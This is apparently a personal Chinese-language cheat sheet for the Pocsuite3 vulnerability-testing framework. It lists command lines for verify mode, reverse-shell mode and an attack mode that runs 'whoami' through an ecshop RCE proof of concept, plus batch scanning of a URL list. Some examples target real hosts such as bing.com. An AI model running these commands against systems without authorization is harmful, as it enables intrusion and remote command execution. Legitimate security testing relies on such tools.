# PocSuite3

- 官网：​http://pocsuite.org/​
- 源码：https://github.com/knownsec/pocsuite3

<!-- scp poc.py ubuntu@dev404:/mnt/src/ -->

```
pocsuite -u http://www.bing.com -r poc.py --verify

pocsuite -r poc.py -u www.bing.com --shell --ppt

pocsuite -u http://test.com -r test.py --verify #使用test.py这个PoC去检测http://test.com这个url
pocsuite -u http://test.com -r test.py --verify --shell # shell反连模式
pocsuite -u http://test.com -r ecshop_rce.py --attack --command "whoami" # pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递
pocsuite -f url.txt -r test.py --verify #使用test.py这个PoC去检测url.txt文件里所有的url
#应该有个检测多个PoC的，但不知道怎么写命令，希望有师傅告知
```
